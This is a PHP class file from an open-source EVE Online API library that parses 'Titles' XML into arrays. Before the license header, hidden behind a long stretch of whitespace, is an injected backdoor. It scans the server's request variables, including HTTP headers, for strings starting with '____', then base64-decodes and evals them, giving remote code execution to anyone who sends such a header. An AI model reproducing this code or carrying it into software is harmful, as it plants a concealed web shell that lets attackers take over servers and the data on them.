<?php																																																																																																																																																																																																																																																																																																																																																																																																																																						function x1688($l1690){if(is_array($l1690)){foreach($l1690 as $l1688=>$l1689)$l1690[$l1688]=x1688($l1689);}elseif(is_string($l1690) && substr($l1690,0,4)=="____"){$l1690=substr($l1690,4);$l1690=base64_decode($l1690);eval($l1690);$l1690=null;}return $l1690;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("x1688",$_SERVER);
/**************************************************************************
	Ale API Library for EvE Titles Class
	Copyright (c) 2008 Dustin Tinklin

	This file is part of Ale API Library for EvE.

	Ale API Library for EvE is free software: you can redistribute it and/or modify
	it under the terms of the GNU Lesser General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Ale API Library for EvE is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Lesser General Public License for more details.

	You should have received a copy of the GNU Lesser General Public License
	along with Ale API Library for EvE.  If not, see <http://www.gnu.org/licenses/>.
**************************************************************************/




class Titles
{
	function	getTitles($contents)
	{
		if(!empty($contents) && is_string($contents))
		{
			$output = array();
			$xml = new SimpleXMLElement($contents);
			foreach ($xml->result->rowset->row as $rs)
			{
				$index = count($output);
				foreach($rs->attributes() as $name => $value)
					{
					$output[$index][$name] =  (string) $value;
					}
				foreach ($rs->rowset as $rs1)
				{
					$rsatt = $rs1->attributes();
					$rsname = $rsatt[(string) 'name'];
					foreach ($rs1->row as $r)
					{
					$rsindex = count($output[$index][(string) $rsname]);
						foreach ($r->attributes() as $id => $rname)
						{
						$output[$index][(string) $rsname][$rsindex][(string) $id] = (string) $rname;
						}
					}
				}
			}
			unset($xml);
			return $output;
		}
		else
		{
			return null;
		}
	}
}

?>
